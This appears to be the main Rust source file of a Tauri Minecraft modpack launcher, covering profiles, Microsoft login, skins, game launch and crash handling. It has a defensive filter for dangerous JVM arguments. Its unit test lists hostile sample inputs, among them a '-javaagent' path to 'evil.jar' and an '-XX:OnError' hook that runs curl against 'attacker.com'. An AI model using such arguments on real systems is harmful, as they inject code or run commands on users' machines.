mod announcements;
pub mod auth;
mod fs_utils;
pub mod minecraft;
pub mod msa;
pub mod open_launcher;
pub mod state;
pub mod technic;
pub mod wardrobe;

use crate::auth::{Profile, ProfileStore};
use crate::state::LauncherState;
use crate::wardrobe::WardrobeStore;
use std::sync::{Arc, Mutex, OnceLock};
use std::time::Instant;
use tauri::{AppHandle, Emitter, Manager, State};

#[global_allocator]
static GLOBAL: mimalloc::MiMalloc = mimalloc::MiMalloc;

static START_TIME: OnceLock<Instant> = OnceLock::new();
static STARTUP_MEASURED: OnceLock<u64> = OnceLock::new();

pub fn init_start_time() {
    START_TIME.get_or_init(Instant::now);
}

#[tauri::command]
fn get_startup_time() -> u64 {
    *STARTUP_MEASURED.get_or_init(|| {
        START_TIME
            .get()
            .map(|t| t.elapsed().as_millis() as u64)
            .unwrap_or(0)
    })
}

#[repr(C)]
#[derive(Default)]
struct TaskVmInfo {
    virtual_size: u64,
    region_count: u32,
    page_size: u32,
    resident_size: u64,
    resident_size_peak: u64,
    device: u64,
    device_peak: u64,
    internal: u64,
    internal_peak: u64,
    external: u64,
    external_peak: u64,
    reusable: u64,
    reusable_peak: u64,
    purgeable_volatile_pmap: u64,
    purgeable_volatile_resident: u64,
    purgeable_volatile_virtual: u64,
    compressed: u64,
    compressed_peak: u64,
    compressed_lifetime: u64,
    phys_footprint: u64,
}

#[tauri::command]
fn get_app_memory_usage() -> u64 {
    #[cfg(target_os = "macos")]
    {
        use std::mem::MaybeUninit;
        const TASK_VM_INFO: libc::c_uint = 22;
        const TASK_VM_INFO_COUNT: libc::mach_msg_type_number_t = (std::mem::size_of::<TaskVmInfo>()
            / std::mem::size_of::<libc::natural_t>())
            as libc::mach_msg_type_number_t;

        let mut info = MaybeUninit::<TaskVmInfo>::uninit();
        let mut count = TASK_VM_INFO_COUNT;

        #[allow(deprecated)]
        let kret = unsafe {
            libc::task_info(
                libc::mach_task_self(),
                TASK_VM_INFO,
                info.as_mut_ptr() as libc::task_info_t,
                &mut count,
            )
        };

        if kret == libc::KERN_SUCCESS {
            let vm_info = unsafe { info.assume_init() };
            return vm_info.phys_footprint / 1024 / 1024;
        }
    }

    #[cfg(not(target_os = "macos"))]
    {
        if let Ok(pid) = sysinfo::get_current_pid() {
            let mut sys = sysinfo::System::new();
            if sys.refresh_processes_specifics(
                sysinfo::ProcessesToUpdate::Some(&[pid]),
                true,
                sysinfo::ProcessRefreshKind::nothing().with_memory(),
            ) > 0
            {
                if let Some(process) = sys.process(pid) {
                    return process.memory() / 1024 / 1024;
                }
            }
        }
    }

    0
}

pub struct AppState {
    pub launcher_state: Mutex<LauncherState>,
    pub profile_store: ProfileStore,
    pub wardrobe_store: WardrobeStore,
    pub last_crash: Mutex<Option<minecraft::crash::CrashDiag>>,
    pub is_game_running: std::sync::atomic::AtomicBool,
}

pub fn is_safe_jvm_arg(arg: &str) -> bool {
    let lower = arg.to_lowercase();
    let dangerous_prefixes = [
        "-javaagent:",
        "-agentlib:",
        "-agentpath:",
        "-xbootclasspath",
        "-xx:onerror=",
        "-xx:onoutofmemoryerror=",
        "-xx:errorfile=",
        "-dcom.sun.management.jmxremote",
    ];
    for prefix in &dangerous_prefixes {
        if lower.starts_with(prefix) {
            return false;
        }
    }
    true
}

#[tauri::command]
fn get_launcher_state(state: State<'_, AppState>) -> Result<LauncherState, String> {
    let state = state.launcher_state.lock().map_err(|e| e.to_string())?;
    Ok(state.clone())
}

#[tauri::command]
fn update_launcher_state(
    app: AppHandle,
    new_state: LauncherState,
    state: State<'_, AppState>,
) -> Result<(), String> {
    let mut current_state = state.launcher_state.lock().map_err(|e| e.to_string())?;
    *current_state = new_state.clone();
    current_state.normalize();
    current_state.save(&app)?;
    Ok(())
}

#[tauri::command]
fn get_profiles(state: State<'_, AppState>) -> Result<Vec<Profile>, String> {
    state.profile_store.load()
}

#[tauri::command]
fn add_offline_profile(
    username: String,
    state: State<'_, AppState>,
) -> Result<Vec<Profile>, String> {
    let mut profiles = state.profile_store.load()?;
    let profile = Profile::new_offline(username);
    if let Some(existing) = profiles
        .iter_mut()
        .find(|p| p.id == profile.id || p.username == profile.username)
    {
        *existing = profile;
    } else {
        profiles.push(profile);
    }
    state.profile_store.save(&profiles)?;
    Ok(profiles)
}

#[tauri::command]
fn select_profile(id: String, state: State<'_, AppState>, app: AppHandle) -> Result<(), String> {
    let mut current_state = state.launcher_state.lock().map_err(|e| e.to_string())?;
    current_state.selected_profile_id = Some(id);
    current_state.save(&app)?;
    Ok(())
}

#[tauri::command]
fn remove_profile(
    id: String,
    state: State<'_, AppState>,
    app: AppHandle,
) -> Result<Vec<Profile>, String> {
    let mut profiles = state.profile_store.load()?;
    profiles.retain(|p| p.id != id);
    state.profile_store.save(&profiles)?;

    let mut current_state = state.launcher_state.lock().map_err(|e| e.to_string())?;
    if current_state.selected_profile_id.as_ref() == Some(&id) {
        current_state.selected_profile_id = None;
        current_state.save(&app)?;
    }

    Ok(profiles)
}

#[derive(Clone, serde::Serialize)]
struct LaunchProgressPayload {
    status: String,
    progress: f32,
    detail: Option<String>,
}

#[tauri::command]
fn is_game_running(state: State<'_, AppState>) -> bool {
    state
        .is_game_running
        .load(std::sync::atomic::Ordering::SeqCst)
}

#[tauri::command]
fn get_technic_pack_status() -> Result<Option<technic::InstalledPackManifest>, String> {
    technic::get_pack_status()
}

#[tauri::command]
async fn launch_game(
    profile_id: String,
    version_id: String,
    state: State<'_, AppState>,
    app: AppHandle,
) -> Result<(), String> {
    technic::validate_launch_id(&version_id)?;
    if state
        .is_game_running
        .compare_exchange(
            false,
            true,
            std::sync::atomic::Ordering::SeqCst,
            std::sync::atomic::Ordering::SeqCst,
        )
        .is_err()
    {
        return Err("O jogo já está iniciando ou em execução".to_string());
    }

    let res = launch_game_inner(profile_id, version_id, &state, app).await;
    if res.is_err() {
        state
            .is_game_running
            .store(false, std::sync::atomic::Ordering::SeqCst);
    }
    res
}

async fn launch_game_inner(
    profile_id: String,
    version_id: String,
    state: &State<'_, AppState>,
    app: AppHandle,
) -> Result<(), String> {
    technic::validate_launch_id(&version_id)?;
    let (launcher_state, profile) = {
        let l_state = state
            .launcher_state
            .lock()
            .map_err(|e| e.to_string())?
            .clone();
        let profiles = state.profile_store.load()?;
        let profile = profiles
            .into_iter()
            .find(|p| p.id == profile_id)
            .ok_or("Profile not found")?;
        (l_state, profile)
    };
    let pack_manifest = technic::ensure_pack_current(&app).await?;

    let auth = if profile.microsoft {
        open_launcher::auth::Auth::new(
            "msa".to_string(),
            "{}".to_string(),
            profile.username.clone(),
            profile.id.clone(),
            profile.access_token.unwrap_or_default(),
        )
    } else {
        open_launcher::auth::OfflineAuth::new(&profile.username)
    };

    let mc_base_version = pack_manifest.minecraft_version.clone();
    let loader = Some("forge".to_string());
    let loader_version = Some(pack_manifest.forge_version.clone());
    let runtime_dir = technic::managed_runtime_root()?;
    let runtime_dir_str = runtime_dir
        .to_str()
        .ok_or("Invalid minecraft dir path")?
        .to_string();
    let game_dir = technic::managed_game_root()?;
    std::fs::create_dir_all(&game_dir)
        .map_err(|error| format!("Could not create DBC Super game directory: {error}"))?;

    let java_path = if let Some(path) = &launcher_state.java_path {
        if path.trim().is_empty() {
            crate::minecraft::java::download_java_if_needed(&mc_base_version, &app).await?
        } else {
            let mut is_ok = false;
            if let Ok(out) = std::process::Command::new(path).arg("-version").output() {
                if out.status.success() {
                    is_ok = true;
                }
            }
            if is_ok {
                path.clone()
            } else {
                crate::minecraft::java::download_java_if_needed(&mc_base_version, &app).await?
            }
        }
    } else {
        crate::minecraft::java::download_java_if_needed(&mc_base_version, &app).await?
    };

    let mut launcher = open_launcher::Launcher::new(
        &runtime_dir_str,
        &java_path,
        open_launcher::version::Version {
            minecraft_version: mc_base_version.clone(),
            loader: loader.clone(),
            loader_version: loader_version.clone(),
        },
    )
    .await;

    launcher.set_execution_directory(game_dir);

    launcher.auth(auth);
    launcher.custom_resolution(
        launcher_state.screen_width as i32,
        launcher_state.screen_height as i32,
    );
    #[cfg(target_os = "macos")]
    {
        launcher.jvm_arg("-XstartOnFirstThread");
        launcher.jvm_arg("-Djava.awt.headless=false");
        launcher.jvm_arg("-Dapple.awt.UIElement=false");
    }

    launcher.jvm_arg(&format!("-Xmx{}M", launcher_state.memory_amount));

    // Modern Aikar's G1GC flags to eliminate lag spikes and optimize chunk generation
    launcher.jvm_arg("-XX:+UseG1GC");
    launcher.jvm_arg("-XX:+ParallelRefProcEnabled");
    launcher.jvm_arg("-XX:MaxGCPauseMillis=200");
    launcher.jvm_arg("-XX:+UnlockExperimentalVMOptions");
    launcher.jvm_arg("-XX:+DisableExplicitGC");
    launcher.jvm_arg("-XX:+AlwaysPreTouch");
    launcher.jvm_arg("-XX:G1NewSizePercent=30");
    launcher.jvm_arg("-XX:G1MaxNewSizePercent=40");
    launcher.jvm_arg("-XX:G1ReservePercent=20");
    launcher.jvm_arg("-XX:G1HeapRegionSize=8M");

    if !launcher_state.jvm_arguments.is_empty() {
        for arg in launcher_state.jvm_arguments.split_whitespace() {
            if is_safe_jvm_arg(arg) {
                launcher.jvm_arg(arg);
            } else {
                eprintln!(
                    "[SECURITY] Filtered out potentially dangerous JVM argument: {}",
                    arg
                );
            }
        }
    }

    let mut progress = launcher.on_progress();
    let app_clone = app.clone();

    tokio::spawn(async move {
        let mut last_emit = std::time::Instant::now()
            .checked_sub(std::time::Duration::from_millis(200))
            .unwrap_or_else(std::time::Instant::now);
        let mut last_status = String::new();

        while let Ok(prog) = progress.recv().await {
            let percentage = if prog.total > 0 {
                prog.current as f32 / prog.total as f32
            } else {
                0.0
            };

            let (base, scale) = match prog.task.as_str() {
                "checking_assets" | "downloading_assets" => (0.6, 0.2),
                "checking_libraries" | "downloading_libraries" | "post_processing" => (0.8, 0.15),
                "checking_natives" | "extracting_natives" => (0.95, 0.05),
                _ => (0.0, 1.0),
            };

            let global_percentage = base + scale * percentage;

            let now = std::time::Instant::now();
            let is_finished = prog.total > 0 && prog.current >= prog.total;
            let status_changed = prog.task != last_status;
            let elapsed_ms = now.duration_since(last_emit).as_millis();

            if is_finished || status_changed || elapsed_ms >= 50 {
                last_emit = now;
                last_status = prog.task.clone();

                let detail = if prog.task == "downloading_assets" {
                    let current_mb = prog.current as f32 / 1_048_576.0;
                    let total_mb = prog.total as f32 / 1_048_576.0;
                    Some(format!("{:.1}/{:.1} MB", current_mb, total_mb))
                } else if prog.task == "downloading_libraries" || prog.task == "extracting_natives"
                {
                    Some(format!("{}/{}", prog.current, prog.total))
                } else {
                    None
                };

                let _ = app_clone.emit(
                    "launch-progress",
                    LaunchProgressPayload {
                        status: prog.task,
                        progress: global_percentage,
                        detail,
                    },
                );
            }
        }
    });

    app.emit(
        "launch-progress",
        LaunchProgressPayload {
            status: "installing_version".to_string(),
            progress: 0.6,
            detail: None,
        },
    )
    .map_err(|e| e.to_string())?;
    launcher
        .install_version()
        .await
        .map_err(|e| e.to_string())?;

    app.emit(
        "launch-progress",
        LaunchProgressPayload {
            status: "installing_assets".to_string(),
            progress: 0.6,
            detail: None,
        },
    )
    .map_err(|e| e.to_string())?;
    launcher.install_assets().await.map_err(|e| e.to_string())?;

    app.emit(
        "launch-progress",
        LaunchProgressPayload {
            status: "installing_libraries".to_string(),
            progress: 0.8,
            detail: None,
        },
    )
    .map_err(|e| e.to_string())?;
    launcher
        .install_libraries()
        .await
        .map_err(|e| e.to_string())?;

    app.emit(
        "launch-progress",
        LaunchProgressPayload {
            status: "launching".to_string(),
            progress: 1.0,
            detail: None,
        },
    )
    .map_err(|e| e.to_string())?;

    let mut command = launcher.command().map_err(|e| e.to_string())?;

    println!("[LAUNCH] {:?}", command);

    command.stdout(std::process::Stdio::piped());
    command.stderr(std::process::Stdio::piped());

    let mut child = command.spawn().map_err(|e| e.to_string())?;

    let session_logs = Arc::new(Mutex::new(Vec::<String>::new()));
    let start_time = std::time::Instant::now();
    let version_id_clone = version_id.clone();
    let memory_amount = launcher_state.memory_amount;

    let app_clone_out = app.clone();
    let session_logs_out = session_logs.clone();
    if let Some(stdout) = child.stdout.take() {
        std::thread::spawn(move || {
            use std::io::{BufRead, BufReader};
            let reader = BufReader::new(stdout);
            for line in reader.lines().flatten() {
                println!("[MC STDOUT] {}", line);
                if let Ok(mut lock) = session_logs_out.lock() {
                    if lock.len() < 2000 {
                        lock.push(line.clone());
                    }
                }
                let _ = app_clone_out.emit("minecraft-log", line);
            }
        });
    }

    let app_clone_err = app.clone();
    let session_logs_err = session_logs.clone();
    if let Some(stderr) = child.stderr.take() {
        std::thread::spawn(move || {
            use std::io::{BufRead, BufReader};
            let reader = BufReader::new(stderr);
            for line in reader.lines().flatten() {
                eprintln!("[MC STDERR] {}", line);
                if let Ok(mut lock) = session_logs_err.lock() {
                    if lock.len() < 2000 {
                        lock.push(line.clone());
                    }
                }
                let _ = app_clone_err.emit("minecraft-error", line);
            }
        });
    }

    let _ = app.emit(
        "launch-progress",
        LaunchProgressPayload {
            status: "success".to_string(),
            progress: 1.0,
            detail: None,
        },
    );

    let app_clone_wait = app.clone();
    let close_after_launch = launcher_state.close_after_launch;

    std::thread::spawn(move || {
        if close_after_launch {
            std::thread::sleep(std::time::Duration::from_millis(4000));
            if let Some(window) = app_clone_wait.get_webview_window("main") {
                let _ = window.hide();
            }
        }

        let exit_status = child.wait().ok();
        let duration_secs = start_time.elapsed().as_secs();

        // Record playtime
        match minecraft::playtime::PlaytimeStore::load(&app_clone_wait) {
            Ok(mut store) => {
                if let Err(error) =
                    store.add_session(&version_id_clone, duration_secs, &app_clone_wait)
                {
                    eprintln!("[PLAYTIME] Could not save playtime data: {error}");
                }
            }
            Err(error) => eprintln!("[PLAYTIME] Could not load playtime data: {error}"),
        }

        // Analyze potential crash
        let logs_combined = session_logs
            .lock()
            .map(|l| l.join("\n"))
            .unwrap_or_default();
        let exit_code = exit_status.and_then(|s| s.code());
        if let Some(diag) =
            minecraft::crash::diagnose(exit_code, &logs_combined, &version_id_clone, memory_amount)
        {
            let _ = app_clone_wait.emit("minecraft-crash-diagnostic", &diag);
            if let Some(app_state) = app_clone_wait.try_state::<AppState>() {
                if let Ok(mut lock) = app_state.last_crash.lock() {
                    *lock = Some(diag);
                }
            }
        }

        if let Some(window) = app_clone_wait.get_webview_window("main") {
            let _ = window.show();
            let _ = window.unminimize();
            let _ = window.set_focus();
        }

        if let Some(app_state) = app_clone_wait.try_state::<AppState>() {
            app_state
                .is_game_running
                .store(false, std::sync::atomic::Ordering::SeqCst);
        }

        let _ = app_clone_wait.emit(
            "launch-progress",
            LaunchProgressPayload {
                status: "finished".to_string(),
                progress: 0.0,
                detail: None,
            },
        );
    });

    Ok(())
}

#[tauri::command]
async fn start_msa_auth() -> Result<msa::DeviceCodeResponse, String> {
    msa::start_device_code_flow().await
}

#[tauri::command]
async fn poll_msa_auth(
    device_code: String,
    interval: u64,
    state: State<'_, AppState>,
) -> Result<Profile, String> {
    let tokens = msa::poll_device_code(&device_code, interval).await?;
    let (xbl_token, uhs) = msa::auth_xbox_live(&tokens.access_token).await?;
    let xsts_token = msa::auth_xsts(&xbl_token).await?;
    let mc_token = msa::auth_minecraft(&uhs, &xsts_token).await?;
    let mc_profile = msa::get_minecraft_profile(&mc_token).await?;

    let active_skin = mc_profile.skins.iter().find(|s| s.state == "ACTIVE");
    let skin_png = Some(format!("https://mc-heads.net/skin/{}", mc_profile.id));
    let slim = active_skin.map(|s| s.variant == "SLIM").unwrap_or(false);

    let mut profiles = state.profile_store.load()?;
    let profile = Profile {
        id: mc_profile.id,
        username: mc_profile.name,
        microsoft: true,
        skin_png,
        cape_png: None,
        slim,
        capes: vec![],
        access_token: Some(mc_token),
        refresh_token: Some(tokens.refresh_token),
    };

    if let Some(existing) = profiles
        .iter_mut()
        .find(|p| p.id == profile.id || p.username == profile.username)
    {
        *existing = profile.clone();
    } else {
        profiles.push(profile.clone());
    }

    state.profile_store.save(&profiles)?;
    Ok(profile)
}

#[tauri::command]
fn get_wardrobe(state: State<'_, AppState>) -> Result<Vec<crate::wardrobe::WardrobeSkin>, String> {
    state.wardrobe_store.load()
}

#[tauri::command]
fn add_skin_to_wardrobe(
    state: State<'_, AppState>,
    file_bytes: Vec<u8>,
    name: String,
    slim: bool,
    profile_id: String,
) -> Result<crate::wardrobe::WardrobeSkin, String> {
    state
        .wardrobe_store
        .add_skin(file_bytes, name, slim, profile_id)
}

#[tauri::command]
fn remove_skin_from_wardrobe(state: State<'_, AppState>, id: String) -> Result<(), String> {
    state.wardrobe_store.remove_skin(&id)
}

#[tauri::command]
async fn apply_skin(
    state: State<'_, AppState>,
    profile_id: String,
    skin_id: String,
) -> Result<(), String> {
    let mut profiles = state.profile_store.load()?;
    let profile = profiles
        .iter_mut()
        .find(|p| p.id == profile_id)
        .ok_or("Profile not found")?;

    let skins = state.wardrobe_store.load()?;
    let skin = skins
        .iter()
        .find(|s| s.id == skin_id)
        .ok_or("Skin not found")?;

    if profile.microsoft {
        let access_token = profile
            .access_token
            .clone()
            .ok_or("No access token for profile")?;
        let variant = if skin.slim { "slim" } else { "classic" };

        use base64::{engine::general_purpose, Engine as _};
        let b64_str = skin
            .base64_data
            .trim_start_matches("data:image/png;base64,");
        let bytes = general_purpose::STANDARD
            .decode(b64_str)
            .map_err(|e| e.to_string())?;

        let temp_dir = std::env::temp_dir();
        let temp_file = temp_dir.join(format!("{}.png", skin.id));
        std::fs::write(&temp_file, &bytes).map_err(|e| e.to_string())?;

        crate::msa::upload_minecraft_skin(&access_token, variant, temp_file.to_str().unwrap())
            .await?;
        let _ = std::fs::remove_file(temp_file);

        // Refetch profile to update slim variant correctly if needed
        let mc_profile = crate::msa::get_minecraft_profile(&access_token).await?;
        let active_skin = mc_profile.skins.iter().find(|s| s.state == "ACTIVE");
        if let Some(active) = active_skin {
            profile.slim = active.variant == "SLIM";
        } else {
            profile.slim = skin.slim;
        }
        // Always use the local base64 data for the UI to avoid CORS and caching delays
        profile.skin_png = Some(skin.base64_data.clone());
    } else {
        profile.skin_png = Some(skin.base64_data.clone());
        profile.slim = skin.slim;
    }

    state.profile_store.save(&profiles)?;
    Ok(())
}

#[tauri::command]
async fn refresh_profile_skin(
    state: State<'_, AppState>,
    profile_id: String,
) -> Result<(), String> {
    let mut profiles = state.profile_store.load()?;
    let profile = profiles
        .iter_mut()
        .find(|p| p.id == profile_id)
        .ok_or("Profile not found")?;

    if profile.microsoft {
        if let Ok(Some((base64_data, slim, cape_b64))) =
            crate::msa::fetch_public_skin_base64(&profile.id).await
        {
            profile.skin_png = Some(base64_data);
            profile.slim = slim;
            profile.cape_png = cape_b64;
            state.profile_store.save(&profiles)?;
        }
    } else {
        let client = reqwest::Client::new();
        let encoded_username = profile
            .username
            .chars()
            .map(|c| match c {
                'a'..='z' | 'A'..='Z' | '0'..='9' | '-' | '_' | '.' | '~' => c.to_string(),
                _ => format!("%{:02X}", c as u32),
            })
            .collect::<String>();
        if let Ok(res) = client
            .get(&format!("https://mc-heads.net/skin/{}", encoded_username))
            .send()
            .await
        {
            if res.status().is_success() {
                if let Ok(bytes) = res.bytes().await {
                    use base64::{engine::general_purpose, Engine as _};
                    profile.skin_png = Some(format!(
                        "data:image/png;base64,{}",
                        general_purpose::STANDARD.encode(&bytes)
                    ));
                    profile.slim = false; // default to classic
                    state.profile_store.save(&profiles)?;
                }
            }
        }
    }
    Ok(())
}

#[tauri::command]
async fn refresh_profile_token(
    state: State<'_, AppState>,
    profile_id: String,
) -> Result<(), String> {
    let mut profiles = state.profile_store.load()?;
    let profile = profiles
        .iter_mut()
        .find(|p| p.id == profile_id)
        .ok_or("Profile not found")?;

    if profile.microsoft {
        if let Some(refresh_token) = &profile.refresh_token {
            if let Ok(new_msa_tokens) = crate::msa::refresh_msa_token(refresh_token).await {
                if let Ok((xbl_token, uhs)) =
                    crate::msa::auth_xbox_live(&new_msa_tokens.access_token).await
                {
                    if let Ok(xsts_token) = crate::msa::auth_xsts(&xbl_token).await {
                        if let Ok(mc_token) = crate::msa::auth_minecraft(&uhs, &xsts_token).await {
                            profile.access_token = Some(mc_token);
                            profile.refresh_token = Some(new_msa_tokens.refresh_token);
                            state.profile_store.save(&profiles)?;
                        }
                    }
                }
            }
        }
    }
    Ok(())
}

#[tauri::command]
async fn get_account_capes(
    state: State<'_, AppState>,
    profile_id: String,
) -> Result<Vec<crate::msa::MinecraftCape>, String> {
    let mut profiles = state.profile_store.load()?;
    let profile = profiles
        .iter_mut()
        .find(|p| p.id == profile_id)
        .ok_or("Profile not found")?;

    if !profile.microsoft {
        return Ok(Vec::new());
    }

    let mut mc_token = profile.access_token.clone();
    if let Some(refresh_token) = &profile.refresh_token {
        if let Ok(new_msa) = crate::msa::refresh_msa_token(refresh_token).await {
            if let Ok((xbl, uhs)) = crate::msa::auth_xbox_live(&new_msa.access_token).await {
                if let Ok(xsts) = crate::msa::auth_xsts(&xbl).await {
                    if let Ok(token) = crate::msa::auth_minecraft(&uhs, &xsts).await {
                        mc_token = Some(token.clone());
                        profile.access_token = Some(token);
                        profile.refresh_token = Some(new_msa.refresh_token);
                        state.profile_store.save(&profiles)?;
                    }
                }
            }
        }
    }

    if let Some(token) = mc_token {
        crate::msa::get_account_capes(&token).await
    } else {
        Ok(Vec::new())
    }
}

#[tauri::command]
async fn set_active_cape(
    state: State<'_, AppState>,
    profile_id: String,
    cape_id: Option<String>,
) -> Result<(), String> {
    let mut profiles = state.profile_store.load()?;
    let profile = profiles
        .iter_mut()
        .find(|p| p.id == profile_id)
        .ok_or("Profile not found")?;

    if !profile.microsoft {
        return Err("Capes are only supported on Microsoft accounts".into());
    }

    let mut mc_token = profile.access_token.clone();
    if let Some(refresh_token) = &profile.refresh_token {
        if let Ok(new_msa) = crate::msa::refresh_msa_token(refresh_token).await {
            if let Ok((xbl, uhs)) = crate::msa::auth_xbox_live(&new_msa.access_token).await {
                if let Ok(xsts) = crate::msa::auth_xsts(&xbl).await {
                    if let Ok(token) = crate::msa::auth_minecraft(&uhs, &xsts).await {
                        mc_token = Some(token.clone());
                        profile.access_token = Some(token);
                        profile.refresh_token = Some(new_msa.refresh_token);
                        state.profile_store.save(&profiles)?;
                    }
                }
            }
        }
    }

    if let Some(token) = mc_token {
        crate::msa::set_account_active_cape(&token, cape_id.as_deref()).await
    } else {
        Err("Missing access token for Microsoft profile".into())
    }
}

#[tauri::command]
fn get_playtime_summary(app: AppHandle) -> Result<minecraft::playtime::PlaytimeSummary, String> {
    minecraft::playtime::get_summary(&app)
}

#[tauri::command]
fn get_last_crash_diagnostics(
    state: State<'_, AppState>,
) -> Result<Option<minecraft::crash::CrashDiag>, String> {
    let lock = state.last_crash.lock().map_err(|e| e.to_string())?;
    Ok(lock.clone())
}

#[tauri::command]
async fn apply_crash_action(
    app: AppHandle,
    state: State<'_, AppState>,
    kind: String,
    arg: String,
) -> Result<String, String> {
    match kind.as_str() {
        "set-ram" => {
            let mb: i32 = arg.parse().map_err(|_| "Invalid RAM amount".to_string())?;
            let mut l_state = state.launcher_state.lock().map_err(|e| e.to_string())?;
            l_state.memory_amount = mb;
            l_state.auto_memory = false;
            l_state.save(&app)?;
            Ok(format!("Memory allocated to {} MB", mb))
        }
        "disable-mod" => {
            let mc_dir = technic::managed_game_root()?;
            minecraft::crash::disable_mod_file(&mc_dir, &arg)
        }
        "install-java" => {
            let mut l_state = state.launcher_state.lock().map_err(|e| e.to_string())?;
            l_state.java_path = None;
            l_state.save(&app)?;
            Ok("Reset Java configuration to auto-managed".to_string())
        }
        "open-folder" => {
            use tauri_plugin_opener::OpenerExt;
            let mc_dir = technic::managed_game_root()?;
            app.opener()
                .open_path(mc_dir.to_string_lossy().to_string(), None::<&str>)
                .map_err(|e| e.to_string())?;
            Ok("Game folder opened".to_string())
        }
        "open-url" => {
            use tauri_plugin_opener::OpenerExt;
            app.opener()
                .open_url(arg, None::<&str>)
                .map_err(|e| e.to_string())?;
            Ok("URL opened in browser".to_string())
        }
        _ => Err(format!("Unknown crash action: {}", kind)),
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_process::init())
        .plugin(tauri_plugin_updater::Builder::new().build())
        .plugin(tauri_plugin_opener::init())
        .setup(|app| {
            let handle = app.handle();
            let layout =
                minecraft::versions::StorageLayout::current().map_err(std::io::Error::other)?;
            let legacy_root =
                minecraft::migration::current_legacy_root().map_err(std::io::Error::other)?;
            minecraft::migration::migrate_legacy_data_if_needed(&layout, &legacy_root)
                .map_err(std::io::Error::other)?;

            let initial_state = LauncherState::load(handle).map_err(std::io::Error::other)?;
            let profile_store = ProfileStore::new(handle).map_err(std::io::Error::other)?;
            let wardrobe_store = WardrobeStore::new(handle).map_err(std::io::Error::other)?;
            app.manage(AppState {
                launcher_state: Mutex::new(initial_state),
                profile_store,
                wardrobe_store,
                last_crash: Mutex::new(None),
                is_game_running: std::sync::atomic::AtomicBool::new(false),
            });
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            get_launcher_state,
            update_launcher_state,
            get_profiles,
            add_offline_profile,
            select_profile,
            remove_profile,
            launch_game,
            is_game_running,
            announcements::fetch_announcements,
            get_technic_pack_status,
            start_msa_auth,
            poll_msa_auth,
            get_wardrobe,
            add_skin_to_wardrobe,
            remove_skin_from_wardrobe,
            apply_skin,
            refresh_profile_skin,
            refresh_profile_token,
            get_account_capes,
            set_active_cape,
            get_startup_time,
            get_app_memory_usage,
            get_playtime_summary,
            get_last_crash_diagnostics,
            apply_crash_action
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_app_memory() {
        let mem = get_app_memory_usage();
        println!("\n>>> ACTUAL MEASURED MEMORY: {} MB <<<\n", mem);
        assert!(mem > 0);
    }

    #[test]
    fn test_is_safe_jvm_arg() {
        assert!(is_safe_jvm_arg("-Xmx4G"));
        assert!(is_safe_jvm_arg("-XX:+UseG1GC"));
        assert!(is_safe_jvm_arg("-Dminecraft.launcher.brand=obsy"));

        assert!(!is_safe_jvm_arg("-javaagent:/tmp/evil.jar"));
        assert!(!is_safe_jvm_arg("-agentlib:jdwp=transport=dt_socket"));
        assert!(!is_safe_jvm_arg("-agentpath:/tmp/lib.so"));
        assert!(!is_safe_jvm_arg("-XX:OnError=curl http://attacker.com"));
        assert!(!is_safe_jvm_arg("-XX:OnOutOfMemoryError=reboot"));
        assert!(!is_safe_jvm_arg("-Xbootclasspath:/tmp/override"));
    }
}
